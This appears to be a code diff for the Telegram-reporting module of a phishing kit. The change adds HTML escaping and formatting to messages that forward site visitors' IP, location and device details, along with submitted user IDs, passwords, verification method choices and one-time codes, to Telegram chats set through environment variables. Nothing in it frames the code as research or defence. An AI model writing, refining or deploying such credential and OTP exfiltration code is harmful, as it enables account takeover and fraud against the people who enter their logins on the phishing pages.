@@ -1,6 +1,20 @@
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
 const CHAT_IDS = process.env.TELEGRAM_CHAT_IDS?.split(',').map(id => id.trim()).filter(Boolean) || []
 
+function escapeHtml(s: string): string {
+  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+}
+
+function asCode(v: unknown): string {
+  const t = v == null || v === '' ? 'Unknown' : String(v).trim() || 'Unknown'
+  return `<code>${escapeHtml(t)}</code>`
+}
+
+function asPre(v: unknown): string {
+  const t = v == null ? '' : String(v)
+  return `<pre>${escapeHtml(t || 'Unknown')}</pre>`
+}
+
 interface VisitorData {
   location?: string
   ip?: string
@@ -40,21 +54,22 @@ interface FormData {
 
 export async function sendVisitorNotification(data: VisitorData) {
   const utcTime = data.utcTime || new Date().toISOString()
-  const message = `🌐 New Visitor
+  const message = `<b>🌐 New Visitor</b>
 ━━━━━━━━━━━━━━━━━━
-📍 Location: ${data.location || 'Unknown'}
-🌍 IP: ${data.ip || 'Unknown'}
-⏰ Timezone: ${data.timezone || 'Unknown'}
-🌐 ISP: ${data.isp || 'Unknown'}
+📍 Location: ${asCode(data.location)}
+🌍 IP: ${asCode(data.ip)}
+⏰ Timezone: ${asCode(data.timezone)}
+🌐 ISP: ${asCode(data.isp)}
 
-📱 Device: ${data.device || 'Unknown'}
-🖥️ Screen: ${data.screen || 'Unknown'}
-🌍 Language: ${data.language || 'Unknown'}
-🔗 Referrer: ${data.referrer || 'Direct'}
-🌐 URL: ${data.url || 'Unknown'}
+📱 Device:
+${asPre(data.device)}
+🖥️ Screen: ${asCode(data.screen)}
+🌍 Language: ${asCode(data.language)}
+🔗 Referrer: ${asCode(data.referrer || 'Direct')}
+🌐 URL: ${asCode(data.url)}
 
-⏰ Local Time: ${formatLocalTime(utcTime, data.timezone)}
-🕒 UTC Time: ${formatUtcTime(utcTime)}`
+⏰ Local Time: ${asCode(formatLocalTime(utcTime, data.timezone))}
+🕒 UTC Time: ${asCode(formatUtcTime(utcTime))}`
 
   return sendTelegramMessage(message)
 }
@@ -62,31 +77,31 @@ export async function sendVisitorNotification(data: VisitorData) {
 export async function sendFormNotification(data: FormData) {
   let message: string
   if (data.type === 'login') {
-    message = `🔐 Login Attempt
+    message = `<b>🔐 Login Attempt</b>
 ━━━━━━━━━━━━━━━━━━
-👤 User ID: ${data.userId || ''}
-🔒 Password: ${data.password || ''}`
+👤 User ID: ${asCode(data.userId)}
+🔒 Password: ${asCode(data.password)}`
   } else if (data.type === 'email_selection' || data.type === 'text_selection') {
     const method = data.type === 'email_selection' ? 'Email' : 'Text Message (SMS)'
-    message = `🔐 Verify Your Identity
+    message = `<b>🔐 Verify Your Identity</b>
 ━━━━━━━━━━━━━━━━━━
 
-Method Selected: ${method}`
+Method Selected: ${asCode(method)}`
   } else if (data.type === 'email_verification' || data.type === 'text_verification') {
     const typeLabel = data.type === 'email_verification' ? 'Email' : 'Text'
-    message = `✅ Verification Code Submitted
-🔐 Type: ${typeLabel}
-🔢 Code: ${data.otp || ''}`
+    message = `<b>✅ Verification Code Submitted</b>
+🔐 Type: ${asCode(typeLabel)}
+🔢 Code: ${asCode(data.otp)}`
   } else {
-    message = `📝 Form Submission
-🔹 Type: ${data.type}
-📄 Page: ${data.page}
-🕒 Time: ${data.timestamp}
-${data.userId ? `👤 User ID: ${data.userId}` : ''}
-${data.password ? `🔒 Password: ${data.password}` : ''}
-${data.email ? `📧 Email: ${data.email}` : ''}
-${data.phone ? `📱 Phone: ${data.phone}` : ''}
-${data.otp ? `🔐 OTP Code: ${data.otp}` : ''}`
+    message = `<b>📝 Form Submission</b>
+🔹 Type: ${asCode(data.type)}
+📄 Page: ${asCode(data.page)}
+🕒 Time: ${asCode(data.timestamp)}
+${data.userId ? `👤 User ID: ${asCode(data.userId)}` : ''}
+${data.password ? `🔒 Password: ${asCode(data.password)}` : ''}
+${data.email ? `📧 Email: ${asCode(data.email)}` : ''}
+${data.phone ? `📱 Phone: ${asCode(data.phone)}` : ''}
+${data.otp ? `🔐 OTP Code: ${asCode(data.otp)}` : ''}`
   }
   return sendTelegramMessage(message)
 }
@@ -110,7 +125,9 @@ async function sendTelegramMessage(message: string) {
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text: message
+        text: message,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
       })
     }).catch(error => {
       console.error(`Failed to send to chat ${chatId}:`, error)
